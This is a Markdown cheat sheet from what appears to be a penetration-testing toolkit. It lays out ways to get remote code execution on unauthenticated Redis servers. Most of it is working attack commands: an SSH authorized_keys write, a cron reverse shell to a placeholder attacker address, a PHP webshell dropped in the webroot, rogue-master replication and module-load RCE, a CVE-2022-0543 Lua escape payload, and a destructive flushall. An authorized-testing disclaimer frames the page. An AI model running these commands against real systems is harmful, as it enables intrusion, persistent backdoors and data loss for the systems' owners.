---
service: redis
title: Redis
ports: 6379, 6380
aliases: redis-server
---

# Redis — quick wins

**When you see it:** 6379/tcp open and `redis-cli -h H ping` returns `PONG` with no
`NOAUTH` error → unauthenticated, full read/write, and `CONFIG` access. That combination
is everything you need for code execution.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off and clean up (`CONFIG SET dir`/`dbfilename` back, remove keys) afterwards.

## Triage (read-only)
```sh
redis-cli -h H ping                 # PONG with no NOAUTH = unauth
redis-cli -h H info server          # redis_version, os, arch
redis-cli -h H info replication     # role:master|slave (matters for replication RCE)
redis-cli -h H config get dir       # current working dir (write-primitive target)
redis-cli -h H config get protected-mode requirepass
redis-cli -h H --scan | head        # sample keys; DBSIZE for count
```

## Quick wins

### SSH authorized_keys write → shell ✏️
```sh
ssh-keygen -t rsa -f ./k -N ''            # your throwaway key
(echo; echo; cat k.pub; echo) > kf
redis-cli -h H flushall                   # ⚠ destructive — only with sign-off
cat kf | redis-cli -h H -x set pwn
redis-cli -h H config set dir /root/.ssh  # or /home/USER/.ssh
redis-cli -h H config set dbfilename authorized_keys
redis-cli -h H save
ssh -i k root@H
```
*Why:* SAVE writes the RDB (which contains your key surrounded by binary) to
`<dir>/<dbfilename>`; sshd ignores the junk lines and accepts the valid key. Needs the
redis user to own a writable `.ssh` and key-auth enabled.

### Cron reverse shell ✏️
```sh
redis-cli -h H config set dir /var/spool/cron/crontabs   # Debian/Ubuntu; RHEL: /var/spool/cron
redis-cli -h H config set dbfilename root
redis-cli -h H set x $'\n\n* * * * * bash -i >& /dev/tcp/ATT/4444 0>&1\n\n'
redis-cli -h H save
```
*Why:* writes a crontab for the redis user. Low success on modern distros (cron rejects
world-writable / bad-perm crontabs), but free to try where redis runs as root.

### Webshell to webroot ✏️
```sh
redis-cli -h H config set dir /var/www/html
redis-cli -h H config set dbfilename shell.php
redis-cli -h H set x '<?php system($_GET["c"]); ?>'
redis-cli -h H save
# curl "http://H/shell.php?c=id"
```
*Why:* only if Redis and a web server share the host and you know the webroot.

### Master–slave replication RCE (no FS write) ✏️
*Use the repo helper — it automates the rogue-master + module load:*
```sh
python3 standalones/redis/redis-rogue-master.py --target H --exploit -- id
```
*Why:* you stand up a rogue master, `SLAVEOF` the target to it, push a malicious module
over the replication stream, `MODULE LOAD` it, and run commands. Works without a writable
filesystem and is the most reliable modern RCE. (Manual path: RedisModules-ExecuteCommand /
redis-rogue-server.)

### Module load RCE (if you can already drop a file) ✏️
```sh
redis-cli -h H module load /tmp/exp.so
redis-cli -h H system.exec "id"
```
*Why:* loads a native module exposing `system.exec`. Needs Redis ≥4 and a path you control.

### Lua sandbox escape — CVE-2022-0543 ✏️
```sh
redis-cli -h H eval 'local o=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");local i=o();return i.popen("id"):read("*a")' 0
```
*Why:* Debian/Ubuntu packaged Redis left the Lua `package`/`io` libs reachable — `EVAL`
alone gives RCE, no `CONFIG` needed. Try this first on Debian-family targets.

## aranum helpers
- `enum-redis.sh` — produced this finding (version, role, unauth check).
- `standalones/redis/redis-rogue-master.py` — replication-based RCE (`--exploit`).
- `standalones/redis/redis-rce-ssh.sh` — automated authorized_keys write (`--write`).
- `standalones/redis/redis-rce-module.sh` — module-load RCE (`--exploit`).
- `standalones/redis/redis-lateral.sh`, `redis-quickwin.sh` — lateral / fast checks.

## Gotchas
- `requirepass` set or `NOAUTH` on ping → authenticated; try default/blank creds, then move on.
- `protected-mode yes` + bound to loopback → not remotely reachable even if "open".
- Hardened deploys `rename-command CONFIG ""` / `MODULE ""` — the write/module paths die; replication RCE may still work.
- Redis 7 ACLs: `ACL WHOAMI` / `ACL LIST` to see what the default user can do.

## Sources
- HackTricks `6379-pentesting-redis`; Hackviser Redis; RouteZero Redis cheat sheet;
  Knownsec404 "RCE via master-slave replication"; CVE-2022-0543 advisories.
